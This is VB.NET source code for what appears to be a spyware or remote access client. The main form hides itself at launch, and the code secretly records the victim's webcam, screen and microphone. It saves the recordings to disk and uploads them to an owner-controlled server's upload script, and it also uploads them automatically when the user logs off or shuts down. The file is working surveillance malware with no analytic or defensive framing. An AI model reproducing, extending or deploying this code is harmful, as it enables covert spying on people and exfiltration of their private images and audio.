Imports System.Runtime.InteropServices
Imports System.Drawing.Imaging
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.IO
Public Class Main
    Dim isWebCamActive As Boolean = False
    Dim isWebCamRecording As Boolean = False
    Dim isScreenRecording As Boolean = False
    Dim isMicRecording As Boolean = False

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub
    Sub UploadFileToServer(ByVal filePath As String)
        Try
            If filePath.ToLower = "null" Or filePath = Nothing Then
            Else
                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
                End
            End If
        Catch ex As Exception
            AddToLog("UploadFileToServer@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
            If isWebCamRecording Then
                UploadFileToServer(StopCamRecord())
            End If
            If isScreenRecording Then
                UploadFileToServer(SaveScreenRecord())
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
        End Try
    End Sub

#Region "WebCam Service"
    Dim DATOS As IDataObject
    Dim IMAGEN As Image
    Public Const WM_CAP As Short = &H400S
    Public Const WM_CAP_DLG_VIDEOFORMAT As Integer = WM_CAP + 41
    Public Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
    Public Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
    Public Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30
    Public Const WM_CAP_SEQUENCE As Integer = WM_CAP + 62
    Public Const WM_CAP_FILE_SAVEAS As Integer = WM_CAP + 23
    Public Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
    Public Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
    Public Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
    Public Const WS_CHILD As Integer = &H40000000
    Public Const WS_VISIBLE As Integer = &H10000000
    Public Const SWP_NOMOVE As Short = &H2S
    Public Const SWP_NOSIZE As Short = 1
    Public Const SWP_NOZORDER As Short = &H4S
    Public Const HWND_BOTTOM As Short = 1
    Public Const WM_CAP_STOP As Integer = WM_CAP + 68
    Public iDevice As Integer = 0 ' Current device ID
    Public hHwnd As Integer
    Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
        (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer,
        <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
    Public Declare Function SetWindowPos Lib "user32" Alias "SetWindowPos" (ByVal hwnd As Integer,
        ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer,
        ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Public Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean
    Public Declare Function capCreateCaptureWindowA Lib "avicap32.dll" _
        (ByVal lpszWindowName As String, ByVal dwStyle As Integer,
        ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer,
        ByVal nHeight As Short, ByVal hWndParent As Integer,
        ByVal nID As Integer) As Integer
    Public Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short,
        ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String,
        ByVal cbVer As Integer) As Boolean
    Dim threadCam As Threading.Thread
    Sub StartCamPreview()
        Try
            If Not isWebCamActive Then
                threadCam = New Threading.Thread(AddressOf OpenPreviewWindow)
                threadCam.Start()
                isWebCamActive = True
            End If
        Catch ex As Exception
            AddToLog("StartCamPreview@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub OpenPreviewWindow()
        Try
            hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, 480, Me.Handle.ToInt32, 0)
            Dim CAMARA As Integer = Nothing
            For I = 0 To 10
                CAMARA = SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0)
                If CAMARA > 0 Then
                    SendMessage(hHwnd, WM_CAP_SET_SCALE, True, 0)
                    SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)
                    SendMessage(hHwnd, WM_CAP_SET_PREVIEW, True, 0)
                    SetWindowPos(hHwnd, HWND_BOTTOM, 0, 0, 800, 600, SWP_NOMOVE Or SWP_NOZORDER)
                    Exit For
                End If
            Next
        Catch ex As Exception
            DestroyWindow(hHwnd)
            AddToLog("OpenPreviewWindow@Main", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
    Function TakeCamPicture() As String
        Try
            StartCamPreview()
            Threading.Thread.Sleep(10500)
            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
            If My.Computer.FileSystem.FileExists(filePath) Then
                My.Computer.FileSystem.DeleteFile(filePath)
            End If
            SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
            DATOS = Clipboard.GetDataObject()
            IMAGEN = CType(DATOS.GetData(GetType(System.Drawing.Bitmap)), Image)
            IMAGEN.Save(filePath, Imaging.ImageFormat.Png)
            Return filePath
        Catch ex As Exception
            AddToLog("TakeCamPicture@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Function StartCamRecord() As String
        Try
            StartCamPreview()
            Threading.Thread.Sleep(10500)
            If Not isWebCamRecording Then
                SendMessage(hHwnd, WM_CAP_DLG_VIDEOFORMAT, 0, 0)
                SendMessage(hHwnd, WM_CAP_SEQUENCE, 0, 0)
                isWebCamRecording = True
            End If
            Return 0
        Catch ex As Exception
            AddToLog("StartCamRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Function StopCamRecord() As String
        Try
            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
            If isWebCamRecording Then
                SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
                SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
                Try
                    If My.Computer.FileSystem.FileExists("C:\CAPTURE.avi") Then
                        My.Computer.FileSystem.DeleteFile("C:\CAPTURE.avi")
                    End If
                Catch
                End Try
                isWebCamRecording = False
            End If
            Return filePath
        Catch ex As Exception
            AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
#End Region

#Region "Screen Service"
    Dim ScreenRecordmisImagenes As New ArrayList
    Dim ScreenRecordsPath As String = DIRHome & "\snapshots"
    Dim ScreenRecordThread As Threading.Thread
    Dim index As Integer = 0
    Function StartScreenRecord() As String
        Try
            If Not isScreenRecording Then
                ScreenRecordmisImagenes.Clear()
                If My.Computer.FileSystem.DirectoryExists(ScreenRecordsPath) Then
                    My.Computer.FileSystem.DeleteDirectory(ScreenRecordsPath, FileIO.DeleteDirectoryOption.DeleteAllContents)
                End If
                index = 0
                isScreenRecording = True
                ScreenRecordThread = New Threading.Thread(AddressOf ScreenRecorder)
                ScreenRecordThread.Start()
            End If
            Return 0
        Catch ex As Exception
            AddToLog("StartScreenRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Sub StopScreenRecord()
        Try
            If isScreenRecording Then
                isScreenRecording = False
                ScreenRecordThread.Abort()
            End If
        Catch ex As Exception
            AddToLog("StopScreenRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function SaveScreenRecord() As String
        Try
            StopScreenRecord()
            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_ScreenVideo.avi"
            'Elimina la ultima imagen, ya que podria estar dañada
            If My.Computer.FileSystem.FileExists(ScreenRecordsPath & "\img_" & index & ".jpg") Then
                My.Computer.FileSystem.DeleteFile(ScreenRecordsPath & "\img_" & index & ".jpg")
            End If
            For Each IMAGENes In IO.Directory.GetFiles(ScreenRecordsPath)
                Dim BM As Bitmap = Image.FromFile(IMAGENes)
                Dim BM2 As Bitmap = New Bitmap(CInt(BM.Width * 50 / 100), CInt(BM.Height * 50 / 100)) 'Tamaños
                Dim REDUCCION As Graphics = Graphics.FromImage(BM2)
                REDUCCION.DrawImage(BM, 0, 0, BM2.Width, BM2.Height)
                ScreenRecordmisImagenes.Add(BM)
            Next
            If ScreenRecordmisImagenes.Count > 0 Then
                Dim ESCRITOR As New AviWriter
                ESCRITOR.OpenAVI(filePath, 1) '1fps (mas lento)
                For Each IMAGEN In ScreenRecordmisImagenes
                    ESCRITOR.AddFrame(IMAGEN)
                Next
                ESCRITOR.AddFrame(ScreenRecordmisImagenes(ScreenRecordmisImagenes.Count - 1))
                ESCRITOR.Close()
                AddToLog("SaveScreenRecord@Main", "Video saved!", False)
                Return filePath
            Else
                AddToLog("SaveScreenRecord@Main", "No images?", False)
                Return "null"
            End If
        Catch ex As Exception
            AddToLog("SaveScreenRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Sub ScreenRecorder()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(ScreenRecordsPath) Then
                My.Computer.FileSystem.CreateDirectory(ScreenRecordsPath)
            End If
            While isScreenRecording
                Try
                    Dim BF As New BinaryFormatter
                    Dim IMAGEN As Bitmap
                    Dim BM As Bitmap
                    BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                    Dim DIBUJO As Graphics
                    DIBUJO = Graphics.FromImage(BM)
                    DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
                    DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
                    IMAGEN = New Bitmap(BM)
                    Dim DIBUJO2 As Graphics
                    DIBUJO2 = Graphics.FromImage(IMAGEN)
                    Dim MICURSOR As Cursor = Cursors.Hand
                    Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
                    MICURSOR.Draw(DIBUJO2, RECTANGULO)
                    Dim MS As New MemoryStream
                    IMAGEN.Save(MS, Imaging.ImageFormat.Jpeg)
                    IMAGEN = Image.FromStream(MS)
                    IMAGEN.Save(ScreenRecordsPath & "\img_" & index & ".jpg", Imaging.ImageFormat.Jpeg)
                    index += 1
                    Threading.Thread.Sleep(5000)
                Catch ex As Exception
                    AddToLog("ScreenRecorder@Main", "Error: " & ex.Message, True)
                    Exit Sub
                End Try
            End While
        Catch ex As Exception
            AddToLog("ScreenRecorder@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
#End Region

#Region "Mic Service"
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String,
                                                                                   ByVal lpstrReturnString As String,
                                                                                   ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Sub StartMicRecord()
        Try
            If Not isMicRecording Then
                Dim BITS As Integer = 16
                Dim CANALES As Integer = 2
                Dim MUESTRAS As Integer = 44100
                Dim PROMEDIO As Integer = BITS * CANALES * MUESTRAS / 8
                Dim ALINEACION As Integer = BITS * CANALES / 8
                Dim COMANDO As String
                COMANDO = "set capture bitspersample " & BITS & " channels " & CANALES & " alignment " & ALINEACION & " samplespersec " &
                MUESTRAS & " bytespersec " & PROMEDIO & " format tag pcm wait"
                mciSendString("close capture", "", 0, 0)
                mciSendString("open new type waveaudio alias capture", "", 0, 0)
                mciSendString(COMANDO, "", 0, 0)
                mciSendString("record capture", "", 0, 0)
                isMicRecording = True
            End If
        Catch ex As Exception
            AddToLog("StartMicRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StopMicRecord(Optional ByVal close As Boolean = False)
        Try
            If Not close Then
                mciSendString("stop capture", "", 0, 0)
            Else
                mciSendString("close capture", "", 0, 0)
            End If
        Catch ex As Exception
            AddToLog("StopMicRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function SaveMicRecord() As String
        Try
            StopMicRecord()
            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_MicRecord.wav"
            mciSendString("save capture " & filePath, "", 0, 0)
            StopMicRecord(True)
            Return filePath
        Catch ex As Exception
            AddToLog("SaveMicRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
#End Region
End Class
Public Class Avi
    Public Const StreamtypeVIDEO As Integer = 1935960438
    Public Const OF_SHARE_DENY_WRITE As Integer = 32
    Public Const BMP_MAGIC_COOKIE As Integer = 19778
    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Public Structure RECTstruc
        Public left As UInt32
        Public top As UInt32
        Public right As UInt32
        Public bottom As UInt32
    End Structure
    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Public Structure BITMAPINFOHEADERstruc
        Public biSize As UInt32
        Public biWidth As Int32
        Public biHeight As Int32
        Public biPlanes As Int16
        Public biBitCount As Int16
        Public biCompression As UInt32
        Public biSizeImage As UInt32
        Public biXPelsPerMeter As Int32
        Public biYPelsPerMeter As Int32
        Public biClrUsed As UInt32
        Public biClrImportant As UInt32
    End Structure
    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Public Structure AVISTREAMINFOstruc
        Public fccType As UInt32
        Public fccHandler As UInt32
        Public dwFlags As UInt32
        Public dwCaps As UInt32
        Public wPriority As UInt16
        Public wLanguage As UInt16
        Public dwScale As UInt32
        Public dwRate As UInt32
        Public dwStart As UInt32
        Public dwLength As UInt32
        Public dwInitialFrames As UInt32
        Public dwSuggestedBufferSize As UInt32
        Public dwQuality As UInt32
        Public dwSampleSize As UInt32
        Public rcFrame As RECTstruc
        Public dwEditCount As UInt32
        Public dwFormatChangeCount As UInt32
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=64)>
        Public szName As UInt16()
    End Structure
    'Initialize the AVI library
    <DllImport("avifil32.dll")>
    Public Shared Sub AVIFileInit()
    End Sub
    'Open an AVI file
    <DllImport("avifil32.dll", PreserveSig:=True)>
    Public Shared Function AVIFileOpen(ByRef ppfile As Integer, ByVal szFile As [String], ByVal uMode As Integer, ByVal pclsidHandler As Integer) As Integer
    End Function
    'Create a new stream in an open AVI file
    <DllImport("avifil32.dll")>
    Public Shared Function AVIFileCreateStream(ByVal pfile As Integer, ByRef ppavi As IntPtr, ByRef ptr_streaminfo As AVISTREAMINFOstruc) As Integer
    End Function
    'Set the format for a new stream
    <DllImport("avifil32.dll")>
    Public Shared Function AVIStreamSetFormat(ByVal aviStream As IntPtr, ByVal lPos As Int32, ByRef lpFormat As BITMAPINFOHEADERstruc, ByVal cbFormat As Int32) As Integer
    End Function
    'Write a sample to a stream
    <DllImport("avifil32.dll")>
    Public Shared Function AVIStreamWrite(ByVal aviStream As IntPtr, ByVal lStart As Int32, ByVal lSamples As Int32, ByVal lpBuffer As IntPtr, ByVal cbBuffer As Int32, ByVal dwFlags As Int32,
         ByVal dummy1 As Int32, ByVal dummy2 As Int32) As Integer
    End Function
    'Release an open AVI stream
    <DllImport("avifil32.dll")>
    Public Shared Function AVIStreamRelease(ByVal aviStream As IntPtr) As Integer
    End Function
    'Release an open AVI file
    <DllImport("avifil32.dll")>
    Public Shared Function AVIFileRelease(ByVal pfile As Integer) As Integer
    End Function
    'Close the AVI library
    <DllImport("avifil32.dll")>
    Public Shared Sub AVIFileExit()
    End Sub
End Class
Public Class AviWriter
    Private aviFile As Integer = 0
    Private aviStream As IntPtr = IntPtr.Zero
    Private frameRate As UInt32 = 0
    Private countFrames As Integer = 0
    Private width As Integer = 0
    Private height As Integer = 0
    Private stride As UInt32 = 0
    Private fccType As UInt32 = Avi.StreamtypeVIDEO
    Private fccHandler As UInt32 = 1668707181
    Private strideInt As Integer
    Private strideU As UInteger
    Private heightU As UInteger
    Private widthU As UInteger
    Public Sub OpenAVI(ByVal fileName As String, ByVal frameRate As UInt32)
        Me.frameRate = frameRate

        Avi.AVIFileInit()


        Dim OpeningError As Integer = Avi.AVIFileOpen(aviFile, fileName, 4097, 0)
        If OpeningError <> 0 Then
            Throw New Exception("Error in AVIFileOpen: " + OpeningError.ToString())
        End If


    End Sub
    Public Sub AddFrame(ByVal bmp As Bitmap)

        bmp.RotateFlip(RotateFlipType.RotateNoneFlipY)

        Dim bmpData As BitmapData = bmp.LockBits(New Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.[ReadOnly], PixelFormat.Format24bppRgb)
        If countFrames = 0 Then
            Dim bmpDatStride As UInteger = bmpData.Stride
            Me.stride = bmpDatStride
            Me.width = bmp.Width
            Me.height = bmp.Height
            CreateStream()
        End If
        strideInt = stride

        Dim writeResult As Integer = Avi.AVIStreamWrite(aviStream, countFrames, 1, bmpData.Scan0, strideInt * height, 0, 0, 0)
        If writeResult <> 0 Then
            Throw New Exception("Error in AVIStreamWrite: " + writeResult.ToString())
        End If

        bmp.UnlockBits(bmpData)
        System.Math.Max(System.Threading.Interlocked.Increment(countFrames), countFrames - 1)
    End Sub
    Private Sub CreateStream()
        Dim strhdr As New Avi.AVISTREAMINFOstruc()
        strhdr.fccType = fccType
        strhdr.fccHandler = fccHandler
        strhdr.dwScale = 1
        strhdr.dwRate = frameRate
        strideU = stride
        heightU = height
        strhdr.dwSuggestedBufferSize = stride * strideU
        strhdr.dwQuality = 10000

        heightU = height
        widthU = width
        strhdr.rcFrame.bottom = heightU
        strhdr.rcFrame.right = widthU
        strhdr.szName = New UInt16(64) {}

        Dim createResult As Integer = Avi.AVIFileCreateStream(aviFile, aviStream, strhdr)
        If createResult <> 0 Then
            Throw New Exception("Error in AVIFileCreateStream: " + createResult.ToString())
        End If
        Dim bi As New Avi.BITMAPINFOHEADERstruc()
        Dim bisize As UInteger = Marshal.SizeOf(bi)
        bi.biSize = bisize
        bi.biWidth = width
        bi.biHeight = height
        bi.biPlanes = 1
        bi.biBitCount = 24

        strideU = stride
        heightU = height
        bi.biSizeImage = strideU * heightU
        Dim formatResult As Integer = Avi.AVIStreamSetFormat(aviStream, 0, bi, Marshal.SizeOf(bi))
        If formatResult <> 0 Then
            Throw New Exception("Error in AVIStreamSetFormat: " + formatResult.ToString())
        End If
    End Sub
    Public Sub Close()
        If aviStream <> IntPtr.Zero Then
            Avi.AVIStreamRelease(aviStream)
            aviStream = IntPtr.Zero
        End If
        If aviFile <> 0 Then
            Avi.AVIFileRelease(aviFile)
            aviFile = 0
        End If
        Avi.AVIFileExit()
    End Sub
End Class